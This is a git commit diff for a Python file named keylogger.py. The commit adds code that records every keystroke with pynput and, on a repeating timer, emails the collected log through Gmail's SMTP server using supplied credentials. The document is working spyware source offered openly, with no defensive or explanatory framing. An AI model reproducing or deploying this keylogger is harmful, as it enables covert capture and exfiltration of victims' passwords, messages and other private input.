2ebfafe68d62cb22e96727e9499ed6f4e401ca70
shaka92 <85701685+shaka92@users.noreply.github.com>
2021-08-01 18:10:46 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -2,14 +2,17 @@
 
 from pynput import keyboard
 import threading
+import smtplib
 
 
 
 class Keylogger():
 
-    def __init__(self, time_interval):
-        self.log = ""
+    def __init__(self, time_interval, email,password):
+        self.log = "it's started!"
         self.interval = time_interval
+        self.email = email
+        self.password = password
 
     def append_to_log(self, string):
         self.log = self.log + string
@@ -21,7 +24,7 @@ class Keylogger():
             if key == key.space:
                 current_key = " "
             elif key == key.tab:
-                current_key = "     "
+                current_key = "\t"
             elif key == key.enter:
                 current_key = "\n"
             else:
@@ -30,11 +33,17 @@ class Keylogger():
 
 
     def report(self):
-        print(self.log)
+        self.send_email(self.email, self.password, "\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
+    def send_email(self,mail, password, message):
+        host = smtplib.SMTP("smtp.gmail.com", 587)
+        host.starttls()
+        host.login(mail, password)
+        host.sendmail(mail, mail, message)
+        host.quit()
     def start(self):
         keyboard_listener = keyboard.Listener(on_press=self.procces_key_press)
         with keyboard_listener:
